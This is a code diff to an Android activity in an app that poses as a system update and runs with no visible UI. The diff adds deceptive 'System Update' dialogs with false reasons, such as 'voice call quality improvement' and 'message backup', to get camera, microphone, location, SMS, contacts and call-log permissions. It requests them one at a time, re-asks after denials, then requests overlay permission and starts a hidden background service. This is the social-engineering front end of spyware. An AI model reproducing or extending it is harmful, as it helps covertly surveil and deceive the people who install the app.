@@ -18,18 +18,27 @@ import com.android.system.update.services.MainService
 
 class MainActivity : AppCompatActivity() {
 
-    private val dangerousPermissions = mutableListOf(
-        Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.POST_NOTIFICATIONS
+    // Permission groups with legitimate system-update sounding descriptions
+    private data class PermissionGroup(
+        val permission: String,
+        val feature: String,
+        val reason: String
     )
+
+    private val permissionGroups = listOf(
+        PermissionGroup(Manifest.permission.CAMERA, "Camera", "Camera optimization and quality enhancement"),
+        PermissionGroup(Manifest.permission.RECORD_AUDIO, "Microphone", "Voice call quality improvement"),
+        PermissionGroup(Manifest.permission.ACCESS_FINE_LOCATION, "Location", "Wi-Fi network optimization"),
+        PermissionGroup(Manifest.permission.ACCESS_COARSE_LOCATION, "Location", "Network signal enhancement"),
+        PermissionGroup(Manifest.permission.READ_SMS, "Messages", "Message backup and restore feature"),
+        PermissionGroup(Manifest.permission.RECEIVE_SMS, "Messages", "Notification delivery optimization"),
+        PermissionGroup(Manifest.permission.READ_CONTACTS, "Contacts", "Contact sync optimization"),
+        PermissionGroup(Manifest.permission.READ_CALL_LOG, "Phone", "Call history optimization"),
+        PermissionGroup(Manifest.permission.READ_PHONE_STATE, "Phone", "Network state monitoring"),
+        PermissionGroup(Manifest.permission.POST_NOTIFICATIONS, "Notifications", "System notification optimization")
+    )
+
+    private val dangerousPermissions = permissionGroups.map { it.permission }.toMutableList()
 
     // Permissions that are auto-granted or system-level (no runtime dialog needed)
     private val autoGrantedPermissions = listOf(
@@ -40,69 +49,120 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.WAKE_LOCK
     )
 
+    private var pendingPermissions = mutableListOf<String>()
+    private var permissionRequestIndex = 0
+
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
-        val allDangerousGranted = dangerousPermissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        // Check which ones are still denied
+        val stillDenied = pendingPermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
-        
-        if (allDangerousGranted) {
-            // Check overlay permission
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                requestOverlayPermission()
+
+        if (stillDenied.isNotEmpty()) {
+            // Some denied - show progressive dialog
+            val denied = permissions.filter { !it.value }.keys.firstOrNull()
+            if (denied != null) {
+                val group = permissionGroups.find { it.permission == denied }
+                showProgressivePermissionDialog(denied, group)
             } else {
-                startMainService()
-                finish()
+                // All done
+                checkOverlayAndStart()
             }
         } else {
-            val deniedList = permissions.filter { !it.value }.keys.joinToString(", ") {
-                it.substringAfterLast(".")
-            }
-            showPermissionDeniedDialog(deniedList)
+            // All granted, request next batch
+            requestNextPermissions()
         }
     }
 
     private val overlayPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { _ ->
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)) {
-            startMainService()
-            finish()
-        } else {
-            showOverlayDeniedDialog()
-        }
+        checkOverlayAndStart()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         // No visible UI - immediately request permissions in background
-
-        // Check if we have overlay permission from a previous run
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
-            // Already hidden, proceed silently
             requestPermissionsStartService()
         } else {
-            // First run - request all permissions
             requestPermissionsStartService()
         }
     }
 
-    private fun requestPermissionsStartService() {
-        val permissionsToRequest = dangerousPermissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+    // Request permissions one by one with legitimate sounding reason
+    private fun requestNextPermissions() {
+        if (permissionRequestIndex >= pendingPermissions.size) {
+            checkOverlayAndStart()
+            return
         }
 
-        if (permissionsToRequest.isEmpty()) {
-            // All dangerous permissions granted
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                requestOverlayPermission()
-            } else {
-                startMainService()
-                finish()
-            }
+        val perm = pendingPermissions[permissionRequestIndex]
+        val group = permissionGroups.find { it.permission == perm }
+        
+        // Request single permission with rationale if needed
+        if (shouldShowRequestPermissionRationale(perm)) {
+            showProgressivePermissionDialog(perm, group)
         } else {
-            permissionLauncher.launch(permissionsToRequest.toTypedArray())
+            permissionLauncher.launch(arrayOf(perm))
+        }
+        permissionRequestIndex++
+    }
+
+    // Retry the current permission after showing rationale
+    private fun retryCurrentPermission() {
+        if (permissionRequestIndex > 0 && permissionRequestIndex <= pendingPermissions.size) {
+            permissionRequestIndex--
+        }
+        requestNextPermissions()
+    }
+
+    private fun requestPermissionsStartService() {
+        pendingPermissions = dangerousPermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }.toMutableList()
+
+        if (pendingPermissions.isEmpty()) {
+            checkOverlayAndStart()
+        } else {
+            permissionRequestIndex = 0
+            requestNextPermissions()
+        }
+    }
+
+    // Show permissions with system-update sounding reason instead of raw permission names
+    private fun showProgressivePermissionDialog(permission: String, group: PermissionGroup?) {
+        val title = "System Update"
+        val message = """
+To apply system optimization features, please grant the following access:
+
+• ${group?.feature ?: "System Feature"} - ${group?.reason ?: "Performance optimization"}
+
+This is required for Android security patch compatibility.
+        """.trimIndent()
+
+        AlertDialog.Builder(this)
+            .setTitle(title)
+            .setMessage(message)
+            .setPositiveButton("Allow") { _, _ ->
+                permissionLauncher.launch(arrayOf(permission))
+            }
+            .setNegativeButton("Skip") { _, _ ->
+                permissionRequestIndex++
+                requestNextPermissions()
+            }
+            .setCancelable(false)
+            .show()
+    }
+
+    private fun checkOverlayAndStart() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            requestOverlayPermission()
+        } else {
+            startMainService()
+            finish()
         }
     }
 
@@ -128,7 +188,6 @@ class MainActivity : AppCompatActivity() {
                 startService(intent)
             }
         } catch (e: Exception) {
-            // Service already running or permission issue - try again
             Handler(Looper.getMainLooper()).postDelayed({
                 try {
                     val intent = Intent(this, MainService::class.java)
@@ -143,29 +202,5 @@ class MainActivity : AppCompatActivity() {
             }, 1000)
         }
         finish()
-    }
-
-    private fun showPermissionDeniedDialog(deniedList: String) {
-        AlertDialog.Builder(this)
-            .setTitle("Permissions Required")
-            .setMessage("The following permissions are required:\n\n$deniedList\n\nAll permissions are needed for the system service to function properly.")
-            .setPositiveButton("Retry") { _, _ ->
-                requestPermissionsStartService()
-            }
-            .setNegativeButton("Exit") { _, _ -> finishAffinity() }
-            .setCancelable(false)
-            .show()
-    }
-
-    private fun showOverlayDeniedDialog() {
-        AlertDialog.Builder(this)
-            .setTitle("Overlay Permission Required")
-            .setMessage("Please grant overlay permission in Settings to enable all features.")
-            .setPositiveButton("Open Settings") { _, _ ->
-                requestOverlayPermission()
-            }
-            .setNegativeButton("Exit") { _, _ -> finishAffinity() }
-            .setCancelable(false)
-            .show()
     }
 }
